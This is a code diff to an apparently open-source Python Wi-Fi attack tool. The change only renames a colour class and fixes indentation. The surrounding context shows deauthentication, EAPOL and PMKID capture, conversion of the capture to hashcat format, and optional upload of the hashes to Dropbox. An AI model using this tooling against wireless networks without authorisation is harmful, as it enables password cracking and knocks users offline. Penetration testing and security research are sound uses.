@@ -18,7 +18,7 @@ from scapy.utils import PcapWriter
 global pmkid_file
 
 
-class bcolors:
+class Bcolors:
     HEADER = '\033[95m'
     OKBLUE = '\033[94m'
     OKGREEN = '\033[92m'
@@ -52,31 +52,31 @@ def is_process_running(processName):
 
 def check_depends():
     def _continue_anyway():
-        answer = input(f'{bcolors.WARNING}ARE YOU SURE THAT YOU WANT TO PROCEED?(y/n){bcolors.ENDC}')
+        answer = input(f'{Bcolors.WARNING}ARE YOU SURE THAT YOU WANT TO PROCEED?(y/n){Bcolors.ENDC}')
         if answer == 'y':
             pass
         else:
-            sys.exit(f'\n{bcolors.FAIL}Exiting..{bcolors.ENDC}')
+            sys.exit(f'\n{Bcolors.FAIL}Exiting..{Bcolors.ENDC}')
 
     # Check and exit
     is_root()
     for tool in NECESSARY_TOOLS:
         if shutil.which(tool) is None:
-            print(f"{bcolors.FAIL}Can't find {tool} in PATH, Exiting..{bcolors.ENDC}")
+            print(f"{Bcolors.FAIL}Can't find {tool} in PATH, Exiting..{Bcolors.ENDC}")
             sys.exit()
-    print(f"{bcolors.OKGREEN}Checking depends... OK!{bcolors.ENDC}")
+    print(f"{Bcolors.OKGREEN}Checking depends... OK!{Bcolors.ENDC}")
     # Check and warn
     for proc in DISTURBING_PROCESSES:
         if is_process_running(proc):
             if proc == "wpa_supplicant":
-                print(f"{bcolors.WARNING}Warning! {proc} is running! It is strongly recommended to terminate it to "
-                      f"avoid collisions.{bcolors.ENDC}\n")
-                print(f"{bcolors.WARNING}To properly terminate {proc} run: systemctl stop {proc}.service followed by: "
-                      f"systemctl mask {proc}.service{bcolors.ENDC}\n")
+                print(f"{Bcolors.WARNING}Warning! {proc} is running! It is strongly recommended to terminate it to "
+                      f"avoid collisions.{Bcolors.ENDC}\n")
+                print(f"{Bcolors.WARNING}To properly terminate {proc} run: systemctl stop {proc}.service followed by: "
+                      f"systemctl mask {proc}.service{Bcolors.ENDC}\n")
                 _continue_anyway()
             else:
-                print(f"{bcolors.WARNING}Warning! {proc} Process or Service is running! It is strongly recommended to "
-                      f"terminate it to avoid collisions.{bcolors.ENDC}\n")
+                print(f"{Bcolors.WARNING}Warning! {proc} Process or Service is running! It is strongly recommended to "
+                      f"terminate it to avoid collisions.{Bcolors.ENDC}\n")
                 _continue_anyway()
 
 
@@ -101,12 +101,12 @@ def check_monitor(iface):
             print('Exiting..')
             sys.exit()
 
-    print(f"{bcolors.OKGREEN}Monitor mode... OK!{bcolors.ENDC}")
+    print(f"{Bcolors.OKGREEN}Monitor mode... OK!{Bcolors.ENDC}")
 
 
 def is_root():
     if os.geteuid() != 0:
-        print(f"{bcolors.FAIL}This Program must run with root privileges, Exiting...{bcolors.ENDC}")
+        print(f"{Bcolors.FAIL}This Program must run with root privileges, Exiting...{Bcolors.ENDC}")
         sys.exit()
 
 
@@ -141,7 +141,7 @@ def check_args():
                         default=ENABLE_DROPBOX_UPLOAD, action="store_true", dest="enable_upload")
     results = parser.parse_args()
     return results.iface, results.ap, results.client, results.channel, results.deauth_count, \
-           results.timeout, results.pcap_file, results.enable_upload
+        results.timeout, results.pcap_file, results.enable_upload
 
 
 def sniffer():
@@ -154,7 +154,7 @@ def packethandler(pkt):
         if pkt.haslayer(EAPOL) or (pkt.type == 0 and pkt.addr3 == ap.lower()):
             pktdump.write(pkt)
             if pkt.haslayer(EAPOL):
-                print(f"{bcolors.OKGREEN}Captured EAPOL Packet from SRC:{pkt.addr2} and DST:{pkt.addr1}{bcolors.ENDC}")
+                print(f"{Bcolors.OKGREEN}Captured EAPOL Packet from SRC:{pkt.addr2} and DST:{pkt.addr1}{Bcolors.ENDC}")
                 PACKET_LIST.append(pkt)
 
 
@@ -172,8 +172,8 @@ def try_pmkid(iface, pcap_file, channel, ap):
             try:
                 subtype = packet.wlan.fc_type_subtype.showname_value
                 if 'QoS Data' in subtype:
-                    print(f"{bcolors.WARNING}Found PMKID: {packet.eapol.wlan_rsn_ie_pmkid.replace(':', '')}"
-                          f"*{packet.wlan.sa.replace(':', '')}*{packet.wlan.da.replace(':', '')}{bcolors.ENDC}")
+                    print(f"{Bcolors.WARNING}Found PMKID: {packet.eapol.wlan_rsn_ie_pmkid.replace(':', '')}"
+                          f"*{packet.wlan.sa.replace(':', '')}*{packet.wlan.da.replace(':', '')}{Bcolors.ENDC}")
                     subprocess.call(f"hcxpcapngtool -o {ap.upper()}_pmkid.22000 {pmkid_file}", shell=True)
                     deauth_next = str(input("Continue to Deauth attack?(y/n)"))
 
@@ -226,14 +226,14 @@ def dropbox_uploader():
                             with open(file_path, 'rb') as f:
                                 dbx.files_upload(f.read(), dest_path, mode=dropbox.files.WriteMode.overwrite, mute=True)
                     except Exception as err:
-                        print(f"{bcolors.FAIL}Failed to upload {file}\n{err}{bcolors.ENDC}")
+                        print(f"{Bcolors.FAIL}Failed to upload {file}\n{err}{Bcolors.ENDC}")
     except IOError:
-        print(f"{bcolors.FAIL}Cant find {DROPBOX_KEY_PATH} file. Skipping upload... {bcolors.ENDC}\n")
+        print(f"{Bcolors.FAIL}Cant find {DROPBOX_KEY_PATH} file. Skipping upload... {Bcolors.ENDC}\n")
 
 
 if __name__ == '__main__':
     print_banner()
-    print(f"{bcolors.HEADER}[*] Running...{bcolors.ENDC}")
+    print(f"{Bcolors.HEADER}[*] Running...{Bcolors.ENDC}")
     check_depends()
     iface, ap, client, channel, deauth_count, timeout, pcap_file, enable_upload = check_args()
     check_monitor(iface)
@@ -245,12 +245,12 @@ if __name__ == '__main__':
     t.start()  # Start Sniffing in the backgroud.
     time.sleep(2)  # Wait 2 seconds for sniffing to start.
     send_deauth_packet()  # Send Deauth packet function.
-    print(f"{bcolors.OKBLUE}Sent {deauth_count} Deauth Packet(s){bcolors.ENDC}")
+    print(f"{Bcolors.OKBLUE}Sent {deauth_count} Deauth Packet(s){Bcolors.ENDC}")
     t.join()
-    print(f"{bcolors.WARNING}Captured Total {len(PACKET_LIST)} EAPOL Packets{bcolors.ENDC}"'\n')
+    print(f"{Bcolors.WARNING}Captured Total {len(PACKET_LIST)} EAPOL Packets{Bcolors.ENDC}"'\n')
     print(f"Packets Written to: {(os.getcwd() + '/' + pcap_file)}")
     cap_converter()  # Function that converts pcap to hashcat 22000 mode.
     if enable_upload:
         dropbox_uploader()  # Automatic hash uploader
-    print(f"{bcolors.BGGREEN}Finished.{bcolors.ENDC}")
+    print(f"{Bcolors.BGGREEN}Finished.{Bcolors.ENDC}")
     subprocess.call('echo "\e[?25h"', shell=True)  # unhide bash cursor
